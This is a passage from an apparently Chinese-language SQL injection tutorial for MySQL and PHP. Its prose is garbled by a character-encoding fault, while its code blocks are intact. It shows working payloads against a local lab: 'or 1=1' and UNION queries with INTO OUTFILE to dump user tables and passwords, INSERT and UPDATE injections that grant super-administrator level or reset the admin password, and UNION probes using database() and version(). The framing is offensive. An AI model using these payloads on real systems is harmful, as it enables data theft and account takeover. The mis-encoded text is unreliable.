·å¯ä»¥é˜²æ­¢æ•°æ®åº“è¡¨å’Œæ–‡ä»¶ä¾‹å¦‚/etc/passwdè¢«ç ´åã€‚</li></ul><p>ã€€ã€€æˆ‘ä»¬ç»§ç»­ç”¨ä¸Šé¢çš„user.phpå’Œshow.phpä¸¤ä¸ªæ–‡ä»¶ä¸¾ä¾‹ï¼Œå¦‚æœä¸€ä¸ªä¸€ä¸ªç”¨æˆ·çŒœè§£å®åœ¨æ˜¯å¤ªæ…¢äº†ï¼Œå¦‚æœå¯¹æ–¹çš„å¯†ç æˆ–è€…å…¶ä»–æ•æ„Ÿä¿¡æ¯å¾ˆå¤æ‚ï¼Œåˆä¸ä¼šå†™Exploitï¼Œè¦çŒœåˆ°ä»€ä¹ˆæ—¶å€™å•Šï¼Ÿæ¥ç‚¹å¤§èŒƒå›´çš„ï¼Œç›´æ¥å¯¼å‡ºå…¨éƒ¨æ•°æ®å¥½äº†ã€‚user.phpæ–‡ä»¶çš„æŸ¥è¯¢è¯­å¥ï¼Œæˆ‘ä»¬æŒ‰ç…§into outfileçš„æ ‡å‡†æ ¼å¼ï¼Œæ³¨å…¥æˆä¸‹é¢çš„è¯­å¥å°±èƒ½å¯¼å‡ºæˆ‘ä»¬éœ€è¦çš„ä¿¡æ¯äº†ï¼š</p><p></p><div class="table-box"><table cellspacing="1" cellpadding="5" width="100%" align="center" bgcolor="#cccccc" border="0" style="width:700px;color:rgb(69,69,69);font-size:16px;"><tbody><tr><td bgcolor="#eeeeee"><p><span style="color:#0000ff;">SELECT * FROM user WHERE username='$username' into outfile 'c:/file.txt'</span></p></td></tr></tbody></table></div><p>ã€€ã€€çŸ¥é“æ€ä¹ˆæ ·çš„è¯­å¥å¯ä»¥å®ç°æˆ‘ä»¬çš„ç›®çš„ï¼Œæˆ‘ä»¬å°±å¾ˆå®¹æ˜“æ„é€ å‡ºç›¸åº”çš„è¯­å¥ï¼š</p><p></p><div class="table-box"><table cellspacing="1" cellpadding="5" width="100%" align="center" bgcolor="#cccccc" border="0" style="width:700px;color:rgb(69,69,69);font-size:16px;"><tbody><tr><td bgcolor="#eeeeee"><p><span style="color:#0000ff;">http://127.0.0.1/injection/user.php?username=angel' into outfile 'c:/file.txt</span></p></td></tr></tbody></table></div><p>ã€€ã€€å‡ºç°äº†é”™è¯¯æç¤ºï¼Œä½†ä»è¿”å›çš„è¯­å¥çœ‹æ¥ï¼Œæˆ‘ä»¬çš„SQLè¯­å¥ç¡®å®æ˜¯æ³¨å…¥æ­£ç¡®äº†ï¼Œå³ä½¿å‡ºç°é”™è¯¯ï¼Œä¹Ÿæ˜¯æŸ¥è¯¢çš„é—®é¢˜äº†ï¼Œæ–‡ä»¶è¿˜æ˜¯ä¹–ä¹–çš„è¢«å¯¼å‡ºäº†ï¼Œå¦‚å›¾ï¼š</p><p align="center"><img title="SQLæ³¨å…¥è¯­å¥å¤§å…¨ - ã€è½°éš†éš†ã€‘ - é¾™åœ¨å¤©æ¶¯" height="479" alt="SQLæ³¨å…¥è¯­å¥å¤§å…¨ - ã€è½°éš†éš†ã€‘ - é¾™åœ¨å¤©æ¶¯" src="http://www.4ngel.net/img/php4.gif" width="701" style="border:0px;" /></p><p>ã€€ã€€ç”±äºä»£ç æœ¬èº«å°±æœ‰WHEREæ¥æŒ‡å®šä¸€ä¸ªæ¡ä»¶ï¼Œæ‰€ä»¥æˆ‘ä»¬å¯¼å‡ºçš„æ•°æ®ä»…ä»…æ˜¯æ»¡è¶³è¿™ä¸ªæ¡ä»¶çš„æ•°æ®ï¼Œå¦‚æœæˆ‘ä»¬æƒ³å¯¼å‡ºå…¨éƒ¨å‘¢ï¼Ÿå…¶å®å¾ˆç®€å•ï¼Œåªè¦ä½¿è¿™ä¸ªWHEREæ¡ä»¶ä¸ºå‡ï¼Œå¹¶ä¸”æŒ‡å®šä¸€ä¸ªæˆçœŸçš„æ¡ä»¶ï¼Œå°±å¯ä»¥ä¸ç”¨è¢«æŸç¼šåœ¨WHEREé‡Œäº†ï¼Œæ¥çœ‹çœ‹ç»å…¸1=1å‘æŒ¥ä½œç”¨äº†ï¼š</p><p></p><div class="table-box"><table cellspacing="1" cellpadding="5" width="100%" align="center" bgcolor="#cccccc" border="0" style="width:700px;color:rgb(69,69,69);font-size:16px;"><tbody><tr><td bgcolor="#eeeeee"><p><span style="color:#0000ff;">http://127.0.0.1/injection/user.php?username=' or 1=1 into outfile 'c:/file.txt</span></p></td></tr></tbody></table></div><p>ã€€ã€€å®é™…çš„SQLè¯­å¥å˜ä¸ºï¼š</p><p></p><div class="table-box"><table cellspacing="1" cellpadding="5" width="100%" align="center" bgcolor="#cccccc" border="0" style="width:700px;color:rgb(69,69,69);font-size:16px;"><tbody><tr><td bgcolor="#eeeeee"><p><span style="color:#0000ff;">SELECT * FROM user WHERE username='' or 1=1 into outfile 'c:/file.txt'</span></p></td></tr></tbody></table></div><p>ã€€ã€€è¿™æ ·usernameçš„å‚æ•°æ˜¯ç©ºçš„ï¼Œå°±æ˜¯å‡äº†ï¼Œ1=1æ°¸è¿œæ˜¯çœŸçš„ï¼Œé‚£orå‰é¢çš„WHEREå°±ä¸èµ·ä½œç”¨äº†ï¼Œä½†åƒä¸‡åˆ«ç”¨andå“¦ï¼Œå¦åˆ™æ˜¯ä¸èƒ½å¯¼å‡ºå…¨éƒ¨æ•°æ®çš„ã€‚<br />ã€€ã€€æ—¢ç„¶æ¡ä»¶æ»¡è¶³ï¼Œåœ¨è¿™ç§æƒ…å†µä¸‹å°±ç›´æ¥å¯¼å‡ºæ‰€æœ‰æ•°æ®ï¼å¦‚å›¾ï¼š</p><p align="center"><img title="SQLæ³¨å…¥è¯­å¥å¤§å…¨ - ã€è½°éš†éš†ã€‘ - é¾™åœ¨å¤©æ¶¯" height="126" alt="SQLæ³¨å…¥è¯­å¥å¤§å…¨ - ã€è½°éš†éš†ã€‘ - é¾™åœ¨å¤©æ¶¯" src="http://www.4ngel.net/img/php5.GIF" width="479" style="border:0px;" /></p><p>ã€€ã€€ä½†æ˜¯è·¨è¡¨çš„å¯¼å‡ºæ–‡ä»¶çš„è¯­å¥è¯¥æ€ä¹ˆæ„é€ å‘¢ï¼Ÿè¿˜æ˜¯ç”¨åˆ°UNIONè”åˆæŸ¥è¯¢ï¼Œæ‰€ä»¥ä¸€åˆ‡å‰ææ¡ä»¶éƒ½åº”è¯¥å’ŒUNIONã€å¯¼å‡ºæ•°æ®ä¸€æ ·ï¼Œè·¨è¡¨å¯¼å‡ºæ•°æ®æ­£å¸¸æƒ…å†µä¸‹åº”è¯¥ç›¸ä¸‹é¢çš„ä¸€æ ·ï¼š</p><p></p><div class="table-box"><table cellspacing="1" cellpadding="5" width="100%" align="center" bgcolor="#cccccc" border="0" style="width:700px;color:rgb(69,69,69);font-size:16px;"><tbody><tr><td bgcolor="#eeeeee"><p><span style="color:#0000ff;">SELECT * FROM article WHERE articleid='1' union select 1,username,password from user into outfile 'c:/user.txt'</span></p></td></tr></tbody></table></div><p>ã€€ã€€è¿™æ ·å¯ä»¥å¯¼å‡ºæ–‡ä»¶äº†ï¼Œå¦‚æœæˆ‘ä»¬è¦æ„é€ å°±æäº¤ï¼š</p><p></p><div class="table-box"><table cellspacing="1" cellpadding="5" width="100%" align="center" bgcolor="#cccccc" border="0" style="width:700px;color:rgb(69,69,69);font-size:16px;"><tbody><tr><td bgcolor="#eeeeee"><p><span style="color:#0000ff;">http://127.0.0.1/injection/show.php?id=1' union select 1,username,password from user into outfile 'c:/user.txt</span></p></td></tr></tbody></table></div><p>ã€€ã€€æ–‡ä»¶æ˜¯å‡ºæ¥äº†ï¼Œå¯æ˜¯æœ‰ä¸€ä¸ªé—®é¢˜ï¼Œç”±äºå‰é¢çš„æŸ¥è¯¢articleid='1'ä¸ºçœŸäº†ï¼Œæ‰€ä»¥å¯¼å‡ºçš„æ•°æ®ä¹Ÿæœ‰æ•´ä¸ªæ–‡ç« çš„ä¸€éƒ¨åˆ†ï¼Œå¦‚å›¾ï¼š</p><p align="center"><img title="SQLæ³¨å…¥è¯­å¥å¤§å…¨ - ã€è½°éš†éš†ã€‘ - é¾™åœ¨å¤©æ¶¯" height="134" alt="SQLæ³¨å…¥è¯­å¥å¤§å…¨ - ã€è½°éš†éš†ã€‘ - é¾™åœ¨å¤©æ¶¯" src="http://www.4ngel.net/img/php6.gif" width="544" style="border:0px;" /></p><p>ã€€ã€€æ‰€ä»¥æˆ‘ä»¬æŠŠåº”è¯¥ä½¿å‰é¢çš„æŸ¥è¯¢è¯­å¥ä¸ºå‡ï¼Œæ‰èƒ½åªå¯¼å‡ºåé¢æŸ¥è¯¢çš„å†…å®¹ï¼Œåªè¦æäº¤ï¼š</p><p></p><div class="table-box"><table cellspacing="1" cellpadding="5" width="100%" align="center" bgcolor="#cccccc" border="0" style="width:700px;color:rgb(69,69,69);font-size:16px;"><tbody><tr><td bgcolor="#eeeeee"><p><span style="color:#0000ff;">http://127.0.0.1/injection/show.php?id=' union select 1,username,password from user into outfile 'c:/user.txt</span></p></td></tr></tbody></table></div><p>ã€€ã€€è¿™æ ·æ‰èƒ½å¾—åˆ°æˆ‘ä»¬æƒ³è¦çš„èµ„æ–™ï¼š</p><p align="center"><img title="SQLæ³¨å…¥è¯­å¥å¤§å…¨ - ã€è½°éš†éš†ã€‘ - é¾™åœ¨å¤©æ¶¯" height="126" alt="SQLæ³¨å…¥è¯­å¥å¤§å…¨ - ã€è½°éš†éš†ã€‘ - é¾™åœ¨å¤©æ¶¯" src="http://www.4ngel.net/img/php5.GIF" width="479" style="border:0px;" /></p><p>ã€€ã€€å€¼å¾—æ³¨æ„çš„æ˜¯æƒ³è¦å¯¼å‡ºæ–‡ä»¶ï¼Œå¿…é¡»magic_quotes_gpcæ²¡æœ‰æ‰“å¼€ï¼Œå¹¶ä¸”ç¨‹åºä¹Ÿæ²¡æœ‰ç”¨åˆ°addslashes()å‡½æ•°ï¼Œè¿˜æœ‰ä¸èƒ½å¯¹å•å¼•å·åšä»»ä½•è¿‡æ»¤ï¼Œå› ä¸ºæˆ‘ä»¬åœ¨æäº¤å¯¼å‡ºè·¯å¾„çš„æ—¶å€™ï¼Œä¸€å®šè¦ç”¨å¼•å·åŒ…å«èµ·æ¥ï¼Œå¦åˆ™ï¼Œç³»ç»Ÿä¸ä¼šè®¤è¯†é‚£æ˜¯ä¸€ä¸ªè·¯å¾„ï¼Œä¹Ÿä¸ç”¨å°è¯•ç”¨char()æˆ–è€…ä»€ä¹ˆå‡½æ•°ï¼Œé‚£æ˜¯å¾’åŠ³ã€‚</p><p><span style="font-weight:700;">INSERT</span></p><p>ã€€ã€€å¦‚æœå¤§å®¶è®¤ä¸ºMYSQLä¸­æ³¨å…¥ä»…ä»…é€‚ç”¨äºSELECTå°±å¤§é”™ç‰¹é”™äº†ï¼Œå…¶å®è¿˜æœ‰ä¸¤ä¸ªå±å®³æ›´å¤§çš„æ“ä½œï¼Œé‚£å°±æ˜¯INSERTå’ŒUPDATEè¯­å¥ï¼Œè¿™ç±»ä¾‹å­ä¸å¤šï¼Œå…ˆé¢å…ˆè¯´è¯´INSERTï¼Œè¿™ä¸»è¦åº”ç”¨äºæ”¹å†™æ’å…¥çš„æ•°æ®ï¼Œæˆ‘ä»¬æ¥çœ‹ä¸ªç®€å•è€Œåˆå¹¿æ³›å­˜åœ¨çš„ä¾‹å­ï¼Œçœ‹çœ‹ä¸‹é¢çš„æ•°æ®ç»“æ„ï¼š</p><p></p><div class="table-box"><table cellspacing="1" cellpadding="5" width="100%" align="center" bgcolor="#cccccc" border="0" style="width:700px;color:rgb(69,69,69);font-size:16px;"><tbody><tr><td bgcolor="#eeeeee"><p><span style="color:#0000ff;">CREATE TABLE `user` (<br />`userid` INT NOT NULL AUTO_INCREMENT ,<br />`username` VARCHAR( 20 ) NOT NULL ,<br />`password` VARCHAR( 50 ) NOT NULL ,<br />`homepage` VARCHAR( 255 ) NOT NULL ,<br />`userlevel` INT DEFAULT '1' NOT NULL ,<br />PRIMARY KEY ( `userid` )<br />);</span></p></td></tr></tbody></table></div><p>ã€€ã€€å…¶ä¸­çš„userlevelä»£è¡¨ç”¨æˆ·çš„ç­‰çº§ï¼Œ1æ˜¯æ™®é€šç”¨æˆ·ï¼Œ2æ˜¯æ™®é€šç®¡ç†å‘˜ï¼Œ3æ˜¯è¶…çº§ç®¡ç†å‘˜ï¼Œä¸€ä¸ªæ³¨å†Œç¨‹åºé»˜è®¤æ˜¯æ³¨å†Œæˆæ™®é€šç”¨æˆ·ï¼Œå¦‚ä¸‹ï¼š</p><p></p><div class="table-box"><table cellspacing="1" cellpadding="5" width="100%" align="center" bgcolor="#cccccc" border="0" style="width:700px;color:rgb(69,69,69);font-size:16px;"><tbody><tr><td bgcolor="#eeeeee"><p><span style="color:#0000ff;">INSERT INTO `user` (userid, username, password, homepage, userlevel) VALUES ('', '$username', '$password', '$homepage', '1');</span></p></td></tr></tbody></table></div><p>ã€€ã€€é»˜è®¤userlevelå­—æ®µæ˜¯æ’å…¥1ï¼Œå…¶ä¸­çš„å˜é‡éƒ½æ˜¯æ²¡æœ‰ç»è¿‡è¿‡æ»¤å°±ç›´æ¥å†™å…¥æ•°æ®åº“çš„ï¼Œä¸çŸ¥é“å¤§å®¶æœ‰ä»€ä¹ˆæƒ³æ³•ï¼Ÿå¯¹ï¼Œå°±æ˜¯ç›´æ¥æ³¨å…¥ï¼Œä½¿æˆ‘ä»¬ä¸€æ³¨å†Œå°±æ˜¯è¶…çº§ç®¡ç†å‘˜ã€‚æˆ‘ä»¬æ³¨å†Œçš„æ—¶å€™ï¼Œæ„é€ $homepageå˜é‡ï¼Œå°±å¯ä»¥è¾¾åˆ°æ”¹å†™çš„ç›®çš„ï¼ŒæŒ‡å®š$homepageå˜é‡ä¸ºï¼š</p><p></p><div class="table-box"><table cellspacing="1" cellpadding="5" width="100%" align="center" bgcolor="#cccccc" border="0" style="width:700px;color:rgb(69,69,69);font-size:16px;"><tbody><tr><td bgcolor="#eeeeee"><p><span style="color:#0000ff;">http://4ngel.net', '3â€™)#</span></p></td></tr></tbody></table></div><p>ã€€ã€€æ’å…¥æ•°æ®åº“çš„æ—¶å€™å°±å˜æˆï¼š</p><p></p><div class="table-box"><table cellspacing="1" cellpadding="5" width="100%" align="center" bgcolor="#cccccc" border="0" style="width:700px;color:rgb(69,69,69);font-size:16px;"><tbody><tr><td bgcolor="#eeeeee"><p><span style="color:#0000ff;">INSERT INTO `user` (userid, username, password, homepage, userlevel) VALUES ('', 'angel', 'mypass', 'http://4ngel.net', '3â€™)#', '1');</span></p></td></tr></tbody></table></div><p>ã€€ã€€è¿™æ ·å°±æ³¨å†Œæˆä¸ºè¶…çº§ç®¡ç†å‘˜äº†ã€‚ä½†è¿™ç§åˆ©ç”¨æ–¹æ³•ä¹Ÿæœ‰ä¸€å®šçš„å±€é™æ€§ï¼Œæ¯”å¦‚ï¼Œæˆ‘æ²¡æœ‰éœ€è¦æ”¹å†™çš„å˜é‡å¦‚userlevelå­—æ®µæ˜¯æ•°æ®åº“çš„ç¬¬ä¸€ä¸ªå­—æ®µï¼Œå‰é¢æ²¡æœ‰åœ°æ–¹ç»™æˆ‘ä»¬æ³¨å…¥ï¼Œæˆ‘ä»¬ä¹Ÿæ²¡æœ‰åŠæ³•äº†ã€‚<br />æˆ–è®¸INSERTè¿˜æœ‰æ›´å¹¿æ³›çš„åº”ç”¨ï¼Œå¤§å®¶å¯ä»¥è‡ªè¡Œç ”ç©¶ï¼Œä½†åŸç†éƒ½æ˜¯ä¸€æ ·çš„ã€‚</p><p><span style="font-weight:700;">UPDATE</span></p><p>ã€€ã€€å’ŒINSERTç›¸æ¯”ï¼ŒUPDATEçš„åº”ç”¨æ›´åŠ å¹¿æ³›ï¼Œå¦‚æœè¿‡æ»¤ä¸å¤Ÿï¼Œè¶³ä»¥æ”¹å†™ä»»ä½•æ•°æ®ï¼Œè¿˜æ˜¯æ‹¿åˆšæ‰çš„æ³¨å†Œç¨‹åºæ¥è¯´ï¼Œæ•°æ®ç»“æ„ä¹Ÿä¸å˜ï¼Œæˆ‘ä»¬çœ‹ä¸€ä¸‹ç”¨æˆ·è‡ªå·±ä¿®æ”¹è‡ªå·±çš„èµ„æ–™ï¼ŒSQLè¯­å¥ä¸€èˆ¬éƒ½æ˜¯è¿™æ ·å†™çš„ï¼š</p><p></p><div class="table-box"><table cellspacing="1" cellpadding="5" width="100%" align="center" bgcolor="#cccccc" border="0" style="width:700px;color:rgb(69,69,69);font-size:16px;"><tbody><tr><td bgcolor="#eeeeee"><p><span style="color:#0000ff;">UPDATE user SET password='$password', homepage='$homepage' WHERE id='$id'</span></p></td></tr></tbody></table></div><p>ã€€ã€€ç”¨æˆ·å¯ä»¥ä¿®æ”¹è‡ªå·±çš„å¯†ç å’Œä¸»é¡µï¼Œå¤§å®¶æœ‰ä»€ä¹ˆæƒ³æ³•ï¼Ÿæ€»ä¸è‡³äºè¿˜æ˜¯æå‡æƒé™å§ï¼Ÿç¨‹åºä¸­çš„SQLè¯­å¥åˆæ²¡æœ‰æ›´æ–°userlevelå­—æ®µï¼Œæ€ä¹ˆæå‡å•Šï¼Ÿè¿˜æ˜¯è€åŠæ³•ï¼Œæ„é€ $homepageå˜é‡, æŒ‡å®š$homepageå˜é‡ä¸ºï¼š</p><p></p><div class="table-box"><table cellspacing="1" cellpadding="5" width="100%" align="center" bgcolor="#cccccc" border="0" style="width:700px;color:rgb(69,69,69);font-size:16px;"><tbody><tr><td bgcolor="#eeeeee"><p><span style="color:#0000ff;">http://4ngel.net', userlevel='3</span></p></td></tr></tbody></table></div><p>ã€€ã€€æ•´ä¸ªSQLè¯­å¥å°±å˜æˆè¿™æ ·ï¼š</p><p></p><div class="table-box"><table cellspacing="1" cellpadding="5" width="100%" align="center" bgcolor="#cccccc" border="0" style="width:700px;color:rgb(69,69,69);font-size:16px;"><tbody><tr><td bgcolor="#eeeeee"><p><span style="color:#0000ff;">UPDATE user SET password='mypass', homepage='http://4ngel.net', userlevel='3' WHERE id='$id'</span></p></td></tr></tbody></table></div><p>ã€€ã€€æˆ‘ä»¬æ˜¯ä¸æ˜¯åˆå˜æˆè¶…çº§ç®¡ç†å‘˜äº†ï¼Ÿç¨‹åºä¸æ›´æ–°userlevelå­—æ®µï¼Œæˆ‘ä»¬è‡ªå·±æ¥ã€‚<br />è¿˜æœ‰æ›´åŠ ç»çš„ï¼Œç›´æ¥ä¿®æ”¹ä»»æ„ç”¨æˆ·çš„èµ„æ–™ï¼Œè¿˜æ˜¯åˆšæ‰çš„ä¾‹å¥ï¼Œä½†è¿™æ¬¡å®‰å…¨ä¸€ç‚¹ï¼Œä½¿ç”¨MD5åŠ å¯†ï¼š</p><p></p><div class="table-box"><table cellspacing="1" cellpadding="5" width="100%" align="center" bgcolor="#cccccc" border="0" style="width:700px;color:rgb(69,69,69);font-size:16px;"><tbody><tr><td bgcolor="#eeeeee"><p><span style="color:#0000ff;">UPDATE user SET password='MD5($password)', homepage='$homepage' WHERE id='$id'</span></p></td></tr></tbody></table></div><p>ã€€ã€€å°½ç®¡å¯†ç è¢«åŠ å¯†äº†ï¼Œä½†æˆ‘ä»¬è¿˜æ˜¯å¯ä»¥æ„é€ æˆ‘ä»¬éœ€è¦çš„è¯­å¥ï¼Œæˆ‘ä»¬æŒ‡å®š$passwordä¸ºï¼š</p><p></p><div class="table-box"><table cellspacing="1" cellpadding="5" width="100%" align="center" bgcolor="#cccccc" border="0" style="width:700px;color:rgb(69,69,69);font-size:16px;"><tbody><tr><td bgcolor="#eeeeee"><p><span style="color:#0000ff;">mypass)' WHERE username='admin'#</span></p></td></tr></tbody></table></div><p>ã€€ã€€è¿™æ—¶æ•´ä¸ªè¯­å¥å˜ä¸ºï¼š</p><p></p><div class="table-box"><table cellspacing="1" cellpadding="5" width="100%" align="center" bgcolor="#cccccc" border="0" style="width:700px;color:rgb(69,69,69);font-size:16px;"><tbody><tr><td bgcolor="#eeeeee"><p><span style="color:#0000ff;">UPDATE user SET password='MD5(mypass)' WHERE username='admin'#)', homepage='$homepage' WHERE id='$id'</span></p></td></tr></tbody></table></div><p>ã€€ã€€è¿™æ ·å°±æ›´æ”¹äº†æ›´æ–°çš„æ¡ä»¶ï¼Œæˆ‘ç®¡ä½ åé¢çš„ä»£ç æ˜¯ä¸æ˜¯åœ¨å“­è¿™è¯´ï¼šæˆ‘ä»¬è¿˜æ²¡æœ‰æ‰§è¡Œå•Šã€‚å½“ç„¶ï¼Œä¹Ÿå¯ä»¥ä»$idä¸‹æ‰‹ï¼ŒæŒ‡å®š$idä¸ºï¼š</p><p></p><div class="table-box"><table cellspacing="1" cellpadding="5" width="100%" align="center" bgcolor="#cccccc" border="0" style="width:700px;color:rgb(69,69,69);font-size:16px;"><tbody><tr><td bgcolor="#eeeeee"><p><span style="color:#0000ff;">' OR username='admin'</span></p></td></tr></tbody></table></div><p>ã€€ã€€è¿™æ—¶æ•´ä¸ªè¯­å¥å˜ä¸ºï¼š</p><p></p><div class="table-box"><table cellspacing="1" cellpadding="5" width="100%" align="center" bgcolor="#cccccc" border="0" style="width:700px;color:rgb(69,69,69);font-size:16px;"><tbody><tr><td bgcolor="#eeeeee"><p><span style="color:#0000ff;">UPDATE user SET password='MD5($password)', homepage='$homepage' WHERE id='' OR username='admin'</span></p></td></tr></tbody></table></div><p>ã€€ã€€ç…§æ ·ä¹Ÿå¯ä»¥è¾¾åˆ°ä¿®æ”¹çš„ç›®çš„ï¼Œæ‰€ä»¥è¯´æ³¨å…¥æ˜¯éå¸¸çµæ´»çš„æŠ€æœ¯ã€‚å¦‚æœæœ‰äº›å˜é‡æ˜¯ä»æ•°æ®åº“è¯»å–çš„å›ºå®šå€¼ï¼Œç”šè‡³ç”¨$_SESSION['username']æ¥è¯»å–æœåŠ¡å™¨ä¸Šçš„SESSIONä¿¡æ¯æ—¶ï¼Œæˆ‘ä»¬å°±å¯ä»¥åœ¨åŸæ¥çš„WHEREä¹‹å‰è‡ªå·±æ„é€ WHEREå¹¶æ³¨é‡Šæ‰åé¢çš„ä»£ç ï¼Œç”±æ­¤å¯è§ï¼Œçµæ´»è¿ç”¨æ³¨é‡Šä¹Ÿæ˜¯æ³¨å…¥çš„æŠ€å·§ä¹‹ä¸€ã€‚è¿™äº›æŠ€å·§æŠŠæ³¨å…¥å‘æŒ¥å¾—æ·‹æ¼“å°½è‡´ã€‚ä¸å¾—ä¸è¯´æ˜¯ä¸€ç§è‰ºæœ¯ã€‚<br />ã€€ã€€å˜é‡çš„æäº¤æ–¹å¼å¯ä»¥æ˜¯GETæˆ–POSTï¼Œæäº¤çš„ä½ç½®å¯ä»¥æ˜¯åœ°å€æ ã€è¡¨å•ã€éšè—è¡¨å•å˜é‡æˆ–ä¿®æ”¹æœ¬åœ°COOKIEä¿¡æ¯ç­‰ï¼Œæäº¤çš„æ–¹å¼å¯ä»¥æ˜¯æœ¬åœ°æäº¤ï¼ŒæœåŠ¡å™¨ä¸Šæäº¤æˆ–è€…æ˜¯å·¥å…·æäº¤ï¼Œå¤šç§å¤šæ ·å°±çœ‹ä½ å¦‚ä½•è¿ç”¨äº†ã€‚</p><p><span style="font-weight:700;">é«˜çº§åº”ç”¨</span></p><p><span style="font-weight:700;">1ã€ ä½¿ç”¨MYSQLå†…ç½®å‡½æ•°</span></p><p>ã€€ã€€æˆ‘ä»¬åœ¨ACCESSã€MSSQLä¸­çš„æ³¨å…¥ï¼Œæœ‰å¾ˆå¤šæ¯”è¾ƒé«˜çº§çš„æ³¨å…¥æ–¹æ³•ï¼Œæ¯”å¦‚æ·±å…¥åˆ°ç³»ç»Ÿï¼ŒçŒœä¸­æ–‡ç­‰ï¼Œè¿™äº›ä¸œè¥¿ï¼Œåœ¨MYSQLä¹Ÿèƒ½å¾ˆå¥½å¾—åˆ°å‘æŒ¥ï¼Œå…¶å®åœ¨MYSQLæœ‰å¾ˆå¤šå†…ç½®å‡½æ•°éƒ½å¯ä»¥ç”¨åœ¨SQLè¯­å¥é‡Œï¼Œè¿™æ ·å°±å¯ä»¥ä½¿æˆ‘ä»¬èƒ½åœ¨æ³¨å…¥æ—¶æ›´çµæ´»ï¼Œå¾—åˆ°æ›´å¤šå…³äºç³»ç»Ÿçš„ä¿¡æ¯ã€‚æœ‰å‡ ä¸ªå‡½æ•°æ˜¯æ¯”è¾ƒå¸¸ç”¨çš„ï¼š</p><p></p><div class="table-box"><table cellspacing="1" cellpadding="5" width="100%" align="center" bgcolor="#cccccc" border="0" style="width:700px;color:rgb(69,69,69);font-size:16px;"><tbody><tr><td bgcolor="#eeeeee"><p><span style="color:#0000ff;">DATABASE()<br />USER()<br />SYSTEM_USER()<br />SESSION_USER()<br />CURRENT_USER()<br />â€¦â€¦</span></p></td></tr></tbody></table></div><p>ã€€ã€€å„ä¸ªå‡½æ•°çš„å…·ä½“ä½œç”¨å¤§å®¶å¯ä»¥æŸ¥é˜…MYSQLæ‰‹å†Œï¼Œæ¯”å¦‚ä¸‹é¢è¿™å¥UPDATEï¼š</p><p></p><div class="table-box"><table cellspacing="1" cellpadding="5" width="100%" align="center" bgcolor="#cccccc" border="0" style="width:700px;color:rgb(69,69,69);font-size:16px;"><tbody><tr><td bgcolor="#eeeeee"><p><span style="color:#0000ff;">UPDATE article SET title=$title WHERE articleid=1</span></p></td></tr></tbody></table></div><p>ã€€ã€€æˆ‘ä»¬å¯ä»¥æŒ‡å®š$titleä¸ºä»¥ä¸Šçš„å„ä¸ªå‡½æ•°ï¼Œå› ä¸ºæ²¡æœ‰è¢«å¼•å·åŒ…å«ï¼Œæ‰€ä»¥å‡½æ•°æ˜¯èƒ½æ­£ç¡®æ‰§è¡Œçš„ï¼š</p><p></p><div class="table-box"><table cellspacing="1" cellpadding="5" width="100%" align="center" bgcolor="#cccccc" border="0" style="width:700px;color:rgb(69,69,69);font-size:16px;"><tbody><tr><td bgcolor="#eeeeee"><p><span style="color:#0000ff;">UPDATE article SET title=DATABASE() WHERE id=1&nbsp;<br />#æŠŠå½“å‰æ•°æ®åº“åæ›´æ–°åˆ°titleå­—æ®µ<br />UPDATE article SET title=USER() WHERE id=1&nbsp;<br />#æŠŠå½“å‰ MySQL ç”¨æˆ·åæ›´æ–°åˆ°titleå­—æ®µ<br />UPDATE article SET title=SYSTEM_USER() WHERE id=1&nbsp;<br />#æŠŠå½“å‰ MySQL ç”¨æˆ·åæ›´æ–°åˆ°titleå­—æ®µ<br />UPDATE article SET title=SESSION_USER() WHERE id=1&nbsp;<br />#æŠŠå½“å‰ MySQL ç”¨æˆ·åæ›´æ–°åˆ°titleå­—æ®µ<br />UPDATE article SET title=CURRENT_USER() WHERE id=1&nbsp;<br />#æŠŠå½“å‰ä¼šè¯è¢«éªŒè¯åŒ¹é…çš„ç”¨æˆ·åæ›´æ–°åˆ°titleå­—æ®µ</span></p></td></tr></tbody></table></div><p>ã€€ã€€çµæ´»è¿ç”¨MYSQLå†…ç½®çš„å‡½æ•°ï¼Œå¯ä»¥è·å¾—ä¸å°‘æœ‰ç”¨çš„ä¿¡æ¯ï¼Œæ¯”å¦‚æ•°æ®åº“ç‰ˆæœ¬ã€åå­—ã€ç”¨æˆ·ã€å½“å‰æ•°æ®åº“ç­‰ï¼Œæ¯”å¦‚å‰é¢è·¨è¡¨æŸ¥è¯¢çš„ä¾‹å­ï¼Œæäº¤ï¼š</p><p></p><div class="table-box"><table cellspacing="1" cellpadding="5" width="100%" align="center" bgcolor="#cccccc" border="0" style="width:700px;color:rgb(69,69,69);font-size:16px;"><tbody><tr><td bgcolor="#eeeeee"><p><span style="color:#0000ff;">http://127.0.0.1/injection/show.php?id=1</span></p></td></tr></tbody></table></div><p>ã€€ã€€å¯ä»¥çœ‹åˆ°ä¸€ç¯‡æ–‡ç« ï¼Œæˆ‘ä»¬æ€ä¹ˆæ ·æ‰èƒ½çŸ¥é“MYSQLæ•°æ®åº“çš„ç›¸å…³ä¿¡æ¯å‘¢ï¼ŸåŒæ ·ä¹Ÿæ˜¯ç”¨MYSQLå†…ç½®å‡½æ•°é…åˆUNIONè”åˆæŸ¥è¯¢ï¼Œä¸è¿‡ç›¸æ¯”ä¹‹ä¸‹å°±ç®€å•å¾—å¤šäº†ï¼Œç”šè‡³è¿˜å¯ä»¥è¯»å–æ–‡ä»¶ï¼æ—¢ç„¶è¦ç”¨åˆ°UNIONï¼ŒåŒæ ·è¦æ»¡è¶³UNIONçš„æ¡ä»¶â€”â€”å­—æ®µæ•°ã€æ•°æ®ç±»å‹ç›¸åŒã€‚å¦‚æœæˆ‘ä»¬çŸ¥é“äº†æ•°æ®ç»“æ„ï¼Œç›´æ¥æ„é€ ï¼š</p><p></p><div class="table-box"><table cellspacing="1" cellpadding="5" width="100%" align="center" bgcolor="#cccccc" border="0" style="width:700px;color:rgb(69,69,69);font-size:16px;"><tbody><tr><td bgcolor="#eeeeee"><p><span style="color:#0000ff;">http://127.0.0.1/injection/show.php?id=-1 union select 1,database(),version()</span></p></td></tr></tbody></table></div><p>ã€€ã€€å°±å¯ä»¥è¿”å›å½“å‰æ•°æ®åº“åå’Œæ•°æ®åº“ç‰ˆæœ¬ï¼Œæ„é€ æ˜¯æ¯”è¾ƒå®¹æ˜“çš„ã€‚<br />ã€€ã€€ä¸‹é¢é™„ä¸Šä¸€æ®µç”±æˆ‘å¥½å‹SuperÂ·Heiå†™çš„ä»£ç ï¼Œå¯ä»¥æŠŠå­—ç¬¦ä¸²è½¬æ¢ä¸ºASCIIä»£ç ã€‚æ„Ÿè°¢æä¾›ã€‚</p><p></p><div class="table-box"><table cellspacing="1" cellpadding="5" width="100%" align="center" bgcolor="#cccccc" border="0" 